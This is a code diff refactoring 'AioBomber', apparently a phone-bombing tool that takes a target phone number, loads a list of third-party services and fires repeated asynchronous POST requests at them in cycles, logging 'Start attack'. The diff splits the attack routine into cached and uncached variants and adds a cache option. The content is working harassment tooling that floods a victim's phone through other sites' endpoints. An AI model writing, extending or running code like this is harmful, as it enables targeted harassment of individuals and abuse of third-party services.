@@ -29,30 +29,27 @@ class AioBomber:
                      number_of_cycles: int,
                      phone: str,
                      is_waiting_tasks: bool = True,
-                     is_auto_close_session: bool = True) -> None:
+                     is_auto_close_session: bool = True,
+                     is_use_cache: bool = True) -> None:
         logger.info('Start attack')
         services = await self.sender.get_services(self.path_to_service)
         for _ in range(number_of_cycles):
             if not len(self._cache):
-                self._attacker(phone=phone, services=services)
+                self._attacker_with_data(phone=phone, services=services, save_to_cache=is_use_cache)
             else:
-                self._attacker(cache=self._cache)
+                self._attacker_with_cache(cache=self._cache)
         if is_waiting_tasks:
             await pending_tasks()
         if is_auto_close_session:
             await self.sender.close_session()
 
-    def _attacker(self,
-                  phone: str = None,
-                  services: Union[dict, list] = None,
-                  cache: ServicesCache = None) -> None:
-        if services is not None and phone is not None:
-            for value in services:
-                model = self._preparer.get_service_model(value, phone)
+    def _attacker_with_data(self, phone: str, services: Union[dict, list], save_to_cache: bool = True) -> None:
+        for value in services:
+            model = self._preparer.get_service_model(value, phone)
+            if save_to_cache:
                 self._cache.add_item(model)
-                self._loop.create_task(self.sender.post(**model.generator_args()))
-        elif cache is not None:
-            for value in cache.get_dict_values():
-                self._loop.create_task(self.sender.post(**value))
-        else:
-            raise Exception("Data did not pass verification")
+            self._loop.create_task(self.sender.post(**model.generator_args()))
+
+    def _attacker_with_cache(self, cache: ServicesCache) -> None:
+        for value in cache.get_dict_values():
+            self._loop.create_task(self.sender.post(**value))
